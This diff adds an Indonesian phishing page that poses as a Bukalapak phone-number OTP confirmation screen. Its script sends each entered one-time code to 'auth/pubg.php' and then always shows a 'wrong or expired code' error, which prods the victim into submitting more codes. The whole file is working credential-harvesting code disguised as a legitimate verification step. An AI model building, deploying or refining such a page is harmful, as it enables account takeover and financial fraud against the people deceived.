@@ -1,0 +1,198 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Konfirmasi Nomor Handphone</title>
+  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: Arial, sans-serif;
+      margin: 0;
+      padding: 20px;
+      background-color: #f9f9f9;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+
+    .container {
+      background: #fff;
+      border-radius: 10px;
+      padding: 25px 20px;
+      width: 100%;
+      max-width: 400px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+    }
+
+    .judul-wrapper {
+      margin-bottom: 20px;
+      text-align: center;
+    }
+
+    .judul-wrapper .garis-atas,
+    .judul-wrapper .garis-bawah {
+      height: 1px;
+      background-color: #ddd;
+    }
+
+    .judul-wrapper h2 {
+      font-size: 18px;
+      font-weight: bold;
+      margin: 10px 0;
+    }
+
+    p {
+      font-size: 14px;
+      margin: 5px 0;
+      text-align: center;
+    }
+
+    .resend {
+      color: #d5004c;
+      text-decoration: none;
+      font-weight: bold;
+    }
+
+    .container img {
+      width: 140px;
+      display: block;
+      margin: 20px auto;
+    }
+
+    input[type="tel"] {
+      width: 100%;
+      padding: 12px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      margin: 20px 0;
+      font-size: 14px;
+    }
+
+    button {
+      background-color: #d5004c;
+      color: white;
+      border: none;
+      padding: 12px;
+      font-size: 15px;
+      width: 100%;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+
+    button:hover {
+      background-color: #b8003f;
+    }
+
+    .timer {
+      margin-top: 15px;
+      font-size: 13px;
+      text-align: center;
+    }
+
+    #responseMessage {
+      margin-top: 10px;
+      font-size: 13px;
+      color: red;
+      text-align: center;
+    }
+
+    @media (max-width: 360px) {
+      .container {
+        padding: 20px 15px;
+      }
+
+      .container img {
+        width: 120px;
+      }
+
+      button {
+        font-size: 14px;
+        padding: 10px;
+      }
+
+      input[type="tel"] {
+        font-size: 13px;
+        padding: 10px;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="container">
+  <div class="judul-wrapper">
+    <div class="garis-atas"></div>
+    <h2>Konfirmasi Nomor Handphone</h2>
+    <div class="garis-bawah"></div>
+  </div>
+
+  <p>Kode OTP telah dikirim ke <b id="tujuanOtp">[memuat...]</b></p>
+  <p>Nomor telepon atau email tidak aktif atau hilang? Klik <a href="#" class="resend">di sini</a></p>
+
+  <img src="assets/konfirmasi.png" alt="Bukalapak">
+
+  <p>Masukkan kode ke kotak isian di bawah ini</p>
+
+  <form id="otpForm">
+    <input type="tel" name="otp" placeholder="Tuliskan kode OTP" required>
+    <button type="submit">Konfirmasi</button>
+  </form>
+
+  <div id="responseMessage"></div>
+
+  <div class="timer">
+    Tidak menerima kode? <a href="#" class="resend">Kirim Ulang</a> Tunggu <b id="countdown">01:40</b>
+  </div>
+</div>
+
+<script>
+  const tujuan = sessionStorage.getItem('otp_tujuan');
+  document.getElementById('tujuanOtp').innerText = tujuan ?? "[tidak tersedia]";
+
+  let time = 100;
+  const countdownEl = document.getElementById('countdown');
+  const timer = setInterval(() => {
+    let minutes = Math.floor(time / 60);
+    let seconds = time % 60;
+    if (seconds < 10) seconds = '0' + seconds;
+    countdownEl.innerText = `${minutes}:${seconds}`;
+    time--;
+    if (time < 0) clearInterval(timer);
+  }, 1000);
+
+  document.getElementById('otpForm').addEventListener('submit', function(e) {
+    e.preventDefault();
+
+    const formData = new FormData(this);
+    fetch('auth/pubg.php', {
+      method: 'POST',
+      body: formData
+    })
+    .then(() => {
+      Swal.fire({
+        title: 'Gagal!',
+        text: 'Kode OTP salah atau sudah kedaluwarsa.',
+        icon: 'error',
+        confirmButtonText: 'Coba Lagi'
+      });
+    })
+    .catch(() => {
+      Swal.fire({
+        title: 'Error!',
+        text: 'Tidak dapat terhubung ke server.',
+        icon: 'error',
+        confirmButtonText: 'OK'
+      });
+    });
+  });
+</script>
+
+</body>
+</html>
